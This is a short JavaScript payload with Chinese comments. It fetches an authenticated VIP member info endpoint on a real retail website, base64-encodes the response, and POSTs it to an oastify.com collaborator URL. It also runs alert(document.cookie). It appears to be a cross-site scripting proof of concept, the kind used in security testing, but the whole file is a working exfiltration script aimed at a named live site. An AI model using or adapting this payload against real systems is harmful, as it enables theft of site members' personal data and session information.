/**
 * 步骤1：获取远程HTML内容
 * 步骤2：将HTML转为Base64编码
 * 步骤3：POST发送Base64数据到目标地址
 */
async function fetchAndForwardHTML() {
  // -------------------------- 配置参数 --------------------------
  const htmlSourceUrl = 'https://www.levis.com.tw/webapi/VIPMember/GetVipInfo?isBinding=true&lang=zh-TW&shopId=18793'; // 要获取的远程HTML地址（替换为实际地址）
  const forwardTargetUrl = 'https://659b9qe5lrupnivhjlma5tnzzq5ht9hy.oastify.com/upload'; // 转发的目标POST地址（替换为实际地址）
  // ----------------------------------------------------------------
 
  try {
    // 1. 【获取远程HTML】使用fetch请求HTML内容，指定响应类型为文本
    const htmlResponse = await fetch(htmlSourceUrl);
    if (!htmlResponse.ok) {
      throw new Error(`获取HTML失败：HTTP ${htmlResponse.status}`);
    }
    const rawHtml = await htmlResponse.text(); // 解析响应为纯文本（HTML字符串）
    console.log('✅ 成功获取HTML内容，长度：', rawHtml.length);
 
 
    // 2. 【HTML转Base64】利用btoa()编码，需先转UTF-8避免中文乱码
    // 注意：btoa()仅支持ASCII，中文需通过encodeURIComponent转码后再编码
    const utf8Html = encodeURIComponent(rawHtml); // 转UTF-8编码
    const base64Html = btoa(utf8Html); // 编码为Base64
    console.log('✅ HTML转Base64完成，长度：', base64Html.length);
 
 
    const formData = new URLSearchParams();
    formData.append("source_url", base64Html);
    formData.append("timestamp", new Date().toISOString());
    
    fetch(forwardTargetUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded" // 表单格式
      },
      body: formData // 直接传入URLSearchParams对象
    })
      .then(response => response.json())
      .then(data => console.log("表单提交成功：", data));
 
  } catch (error) {
    // 统一捕获所有环节的错误
    console.error('❌ 流程出错：', error.message);
    return {
      success: false,
      error: error.message
    };
  }
}
alert(document.cookie);
// -------------------------- 调用执行 --------------------------
fetchAndForwardHTML();
